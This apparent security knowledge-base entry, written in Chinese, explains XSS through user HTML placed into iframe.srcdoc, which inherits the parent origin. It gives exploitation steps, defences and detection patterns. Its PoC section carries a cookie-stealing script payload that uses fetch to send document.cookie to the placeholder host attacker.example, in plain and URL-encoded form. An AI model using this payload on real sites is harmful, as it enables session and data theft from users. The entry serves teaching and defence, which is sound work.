---
id: web-generic-xss-iframe-srcdoc-user-html
title: iframe.srcdoc 拼接用户 HTML：srcdoc 继承父源，内联脚本读取同源 Cookie
type: scenario
domain: web
path: web/generic/xss
technique: iframe-srcdoc-html-injection
aliases:
- srcdoc XSS
- iframe srcdoc injection
- HTML Renderer XSS
- html 参数直入 srcdoc
- srcdoc 同源继承
tags:
- web
- xss
- dom-xss
- iframe
- srcdoc
- cookie
- bot
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V215
  verified_at: '2026-11-07T05:04:41+08:00'
  notes: 已对照原文与 img/08 核对 ?html= 参数直接拼进 srcdoc 模板、srcdoc 继承父源、bot 的 flag Cookie httpOnly:false 可被 document.cookie 读取并经 webhook.site 外带。未验证点：未复跑。
---

## 一句话结论

当应用把 URL 参数中的 HTML 内容直接赋给 `iframe.srcdoc` 时，srcdoc 文档默认继承父页面的源，其中的内联 `<script>` 会以同源身份执行，可直接读取父域非 HttpOnly 的 flag/session Cookie 并外带。

## 原理

- `iframe.srcdoc = html` 会把属性值解析成一个独立的 `about:srcdoc` 文档。除显式 sandbox 且不含 `allow-same-origin` 外，srcdoc 文档的 origin 继承嵌入它的文档。
- 示例代码用模板字符串把 `?html=` 参数直接放进 srcdoc 的 `<div>${content}</div>`，没有转义；payload 中的 `<script>` 会在 srcdoc 内正常执行。
- 因为与父页面同源，srcdoc 里的 `document.cookie` 读取的就是父域的 Cookie；本例 bot 设置的 `flag` Cookie 为 `httpOnly:false`，脚本可直接读出。
- 同源还意味着脚本能 `fetch` 父站接口、读 `localStorage`/`sessionStorage`、操作用户页面 DOM（若允许），因此即使没有 Cookie，也可能读取页面中的敏感数据。
- srcdoc 的脚本执行不依赖 `javascript:` URL 或事件处理器，只受父页面 CSP 与 iframe sandbox 限制。

## 触发条件

- 用户可控内容被直接拼接进 `srcdoc`（或由模板字符串生成 srcdoc），且未做 HTML 转义；
- iframe 没有 sandbox，或 sandbox 同时包含 `allow-scripts` 与 `allow-same-origin`；
- bot 会访问带参数的 URL，敏感数据位于同源 Cookie（非 HttpOnly）或页面 DOM 中；
- 页面没有 CSP 阻止内联脚本（或 CSP 允许该脚本）。

## 利用步骤

1. 找到读取 URL 参数并写入 srcdoc 的渲染函数，例如 `getUrlParameter("html")` → `textarea.value` → `iframe.srcdoc = htmlContent`。
2. 构造 payload：`<html><script>fetch('https://attacker.example/?c='+encodeURIComponent(document.cookie))</script></html>`。
3. 把 payload URL 编码后作为 `html` 参数，让 bot 访问 `http://target/?html=<payload>`。
4. 在攻击者服务器查看请求中的 Cookie/FLAG。

## PoC

```html
<html><script>fetch('https://attacker.example/?c='+encodeURIComponent(document.cookie))</script></html>
```

```text
http://target/?html=%3Chtml%3E%3Cscript%3Efetch('https://attacker.example/?c='%2BencodeURIComponent(document.cookie))%3C/script%3E%3C/html%3E
```

## 变体与关联

- sandbox 配置错误仍可读 Cookie：`sandbox="allow-scripts allow-same-origin"` 同时给了脚本和同源；只有 `allow-scripts` 时 srcdoc 成为唯一源，读不到父域 Cookie。
- srcdoc 内可用 `<base>` 改基址、提交表单、`postMessage` 与父页交互；若父页监听 message 并信任来源，可进一步操纵父页。
- 关联：[[web-generic-xss-data-iframe-postmessage-innerhtml]]（iframe/postMessage 类 DOM XSS）、[[web-generic-xss-scriptless-execution-vectors]]（无 script 标签的替代载体）。
- 边界：HTML 被正确转义、CSP 禁止内联脚本、Cookie 为 HttpOnly、sandbox 正确隔离（不含 allow-same-origin）时失效。

## 检测与防御

- 不要把用户 HTML 放进 `srcdoc`；需要渲染用户内容时使用 sandbox（不含 `allow-same-origin`）或独立源，并对内容做严格白名单/净化。
- 敏感 Cookie 设置 `HttpOnly`、`Secure`、`SameSite`；bot 所用 cookie 尤其不应被页面 JS 读取。
- 部署 CSP 限制内联脚本；对 `srcdoc` 赋值点做代码审计。
- 检测：请求参数中出现 `<script`、`srcdoc`、`html=` 等特征；页面渲染后 iframe 内产生外连请求；bot 访问后攻击者域收到带 Cookie 的请求。
